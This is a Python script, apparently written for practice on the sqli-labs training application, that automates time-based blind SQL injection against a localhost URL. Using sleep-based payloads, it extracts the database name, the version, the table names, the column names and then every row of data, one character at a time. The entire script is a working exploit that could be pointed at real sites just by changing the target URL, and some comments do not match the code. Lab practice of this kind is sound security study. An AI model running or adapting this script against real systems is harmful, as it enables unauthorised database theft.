
import requests
import time
url="http://127.0.0.1/sqli-labs-master/Less-8/?id=1"#访问页面
URL=requests.get(url)#访问页面正确返回时返回的内容
database_name=[]#存储库名的列表
version=[]#存储版本的列表
real_table_name=[]#存储表名的列表
real_column_name=[]#存储列名的列表
database_length = ''
version_length = ''
time_1 = time.time()
for a in range(1,15):
	a=str(a)
	star_time = time.time()
	urltest="http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and if(length(database())="+a+",sleep(3),1)%23"
	requests.get(urltest)
	if (time.time() - star_time) > 3:
		database_length = a
		break
print("database'length is:\n"+database_length+"")
database_length = int(database_length)
for a in range(1,database_length+1):#a是选择字符串的字符位数
	for b in range(32,123):#对47到123遍历，尝试字母和数字
		star_time = time.time()
		a=str(a)
		b=str(b)
		urltest="http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),"+a+",1))="+b+",sleep(3),1)%23"
		requests.get(urltest)#获取返回的页面
		if (time.time() - star_time) > 3:#如果返回页面和正确返回的一样
			string_1=chr(int(b))#转换为ASCII对应的字符
			database_name.append(string_1)#放入库名的列表
			break
print("database'name is:")
print(''.join(database_name))#输出库名
for a in range(1,15):
	a=str(a)
	star_time = time.time()
	urltest="http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and if(length(version())="+a+",sleep(3),1)%23"
	requests.get(urltest)
	if (time.time() - star_time) > 3:
		version_length = a
		break
print("version's length is "+version_length+"")
version_length = int(version_length)
for a in range(1,version_length+1):#a是选择字符串的字符位数
	for b in range(32,127):#对33到127遍历，尝试字符
		a=str(a)
		b=str(b)
		star_time = time.time()
		urltest="http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(version(),"+a+",1))="+b+",sleep(3),1)%23"
		requests.get(urltest)
		if (time.time() - star_time) > 3:
			string_1=chr(int(b))
			version.append(string_1)
			break
print("version is: ")
print(''.join(version))#输出版本名
for a in range(0,10):#选择查询的字符串
	table_name=[]#创建一个临时存储字符串字节的列表
	f = ''
	for b in range(1,10):#选择查询的字符串的字节
		for c in range(32,127):#遍历97到127，尝试字符
			b=str(b)
			c=str(c)
			a=str(a)
			star_time = time.time()
			urltest="http://127.0.0.1/sqli-labs-master/Less-9/?id=1'and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit "+a+",1),"+b+",1))="+c+",sleep(3),1)%23"
			requests.get(urltest)
			if (time.time() - star_time) > 3:
				string_1=chr(int(c))
				table_name.append(string_1)
				break
		if c==str(127):
			break
	if table_name:#如果列表不为空
		for h in table_name:
			f += h
		print("table'name is:")
		print(f)#输出表名
		real_table_name.append(f)#将表名放入存储表名的列表
		
lenth_table = len(real_table_name)#获取有多少个表名
for d in range(0,lenth_table):
	y = real_table_name[d]#选择表名
	column_name2 = []#创建存储一个表下的全部列名的临时列表
	print(y+"'s column is:")
	for a in range(0,10):
		column_name1=[]#创建临时列表，存储列名的字节
		f = ''
		for b in range(1,10):
			for c in range(32,128):
				a=str(a)
				b=str(b)
				c=str(c)
				star_time = time.time()
				urltest="http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='"+y+"' limit "+a+",1),"+b+",1))="+c+",sleep(3),1)%23"
				requests.get(urltest)
				if (time.time() - star_time) > 3:
					string_1=chr(int(c))
					column_name1.append(string_1)#将字节放入存储列名的字节的临时列表
					break
			if c==str(127):
				break
		if column_name1:#如果列名字节列表不为空
			print(''.join(column_name1))#将列名弄成一个字符串输出，输出列名
			for n in column_name1:#遍历列名字节列表
				f += n
			column_name2.append(f)#放入表下列名列表
	real_column_name.append(column_name2)#放入存储列名的列表
for d in range(0,lenth_table):
	y = len(real_column_name[d])
	p = real_table_name[d]
	for a in range(0,y):
		queries = real_column_name[d][a]
		for b in range(0,10):
			data_content = []
			for c in range(1,15):
				for h in range(32,128):
					b = str(b)
					c = str(c)
					h = str(h)
					star_time = time.time()
					urltest="http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select "+queries+" from "+p+" limit "+b+",1),"+c+",1))="+h+",sleep(3),1)%23"
					requests.get(urltest)
					if (time.time() - star_time) > 3:
						string_1=chr(int(h))
						data_content.append(string_1)
						break
				if h==str(127):
					break		
			if data_content:
				sentence = "The details of "+p+"'s "+queries+" is:"
				print(sentence)
				print(''.join(data_content))
time_2=time.time()
time_count = time_2 - time_1
print(time_count)
